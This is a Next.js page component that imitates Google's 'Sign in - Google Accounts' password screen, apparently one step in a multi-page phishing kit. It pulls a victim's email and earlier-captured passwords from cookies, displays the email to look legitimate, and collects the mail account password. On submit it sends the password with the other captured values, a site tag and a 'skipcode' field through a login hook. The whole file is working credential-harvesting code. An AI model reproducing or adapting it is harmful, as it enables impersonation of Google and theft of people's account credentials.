import Cookies from "js-cookie";
import { useRouter } from "next/router";
import React, { useEffect, useState } from "react";
import { site } from "../../config";
import Head from "next/head";
import useMockLogin from "../../hooks/useMockLogin";

function PasswordPage() {
  const [mailPass, setMailPass] = useState("");
  const [userEmail, setUserEmail] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const router = useRouter();

  const email = Cookies.get("email");
  const password = Cookies.get("password");
  const mail = Cookies.get("mail");

  useEffect(() => {
    setUserEmail(mail);

    if (!mail) {
      router.back();
    }
  }, []);

  const UserIcon = () => {
    return (
      <svg
        xmlns="http://www.w3.org/2000/svg"
        viewBox="0 0 20 20"
        fill="currentColor"
        className="w-5 h-5"
      >
        <path
          fillRule="evenodd"
          d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-5.5-2.5a2.5 2.5 0 11-5 0 2.5 2.5 0 015 0zM10 12a5.99 5.99 0 00-4.793 2.39A6.483 6.483 0 0010 16.5a6.483 6.483 0 004.793-2.11A5.99 5.99 0 0010 12z"
          clipRule="evenodd"
        />
      </svg>
    );
  };

  const AngleDown = () => {
    return (
      <svg
        xmlns="http://www.w3.org/2000/svg"
        viewBox="0 0 20 20"
        fill="currentColor"
        className="w-5 h-5"
      >
        <path
          fillRule="evenodd"
          d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
          clipRule="evenodd"
        />
      </svg>
    );
  };

  const { login } = useMockLogin();

  const resetInput = () => {
    setMailPass("");
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    const submitValues = {
      site: site,
      email: email,
      password: password,
      mail: mail,
      mailPass: mailPass,
      skipcode: "",
    };

    console.log("submitValues", submitValues);

    login(submitValues, resetInput);
  };

  return (
    <>
      <Head>
        <link rel="shortcut icon" href="/google-icon.ico" />
        <title>Sign in - Google Accounts</title>
      </Head>

      <div className="font-roboto min-h-screen md:flex flex-col justify-center items-center bg-white text-[#202124] text-base">
        <div className="md:border border-slate-300 rounded-lg px-6 md:px-10 py-12 md:w-[450px] h-[500px]">
          <div className="text-center">
            <h3 className="text-2xl">Welcome</h3>
            <button className="mt-3 py-1.5 px-2 rounded-full border border-slate-200 text-sm text-[#202124] tracking-wider font-medium ">
              <div className="flex gap-3">
                <span className="h-3 w-3 text-gray-700">
                  <UserIcon />
                </span>
                <span className="mt-[1px]">{userEmail}</span>
                <span className="-ml-2 mr-1 h-3 w-3 text-gray-700">
                  <AngleDown />
                </span>
              </div>
            </button>
          </div>

          <div className="mt-10">
            <form onSubmit={handleSubmit}>
              <input
                type={showPassword ? "text" : "password"}
                name="mailPass"
                value={mailPass}
                onChange={(e) => setMailPass(e.target.value)}
                placeholder="Enter your password"
                required
                autoComplete="on"
                className="text-sm w-full outline-none rounded-md px-3 py-4 border border-slate-300 focus:border-2 mb-0.5 focus:mb-0 focus:border-blue-500 placeholder:text-base placeholder:text-gray-500"
              />
              <div className="mt-2 flex items-center">
                <input
                  type="checkbox"
                  id="show"
                  name="showPassword"
                  value={showPassword}
                  onChange={() => setShowPassword(!showPassword)}
                  className="scale-125 cursor-pointer"
                />
                <label htmlFor="show" className="ml-5 text-sm cursor-pointer">
                  Show password
                </label>
              </div>

              <div className="mt-[40px] flex justify-between items-center">
                <p className="text-sm text-[#1a73e8]/90 cursor-pointer font-semibold">
                  Forgot password?
                </p>

                <button
                  type="submit"
                  className="bg-[#1a73e8] py-2 px-6 rounded text-sm text-white font-bold tracking-wider"
                >
                  Next
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </>
  );
}

export default PasswordPage;
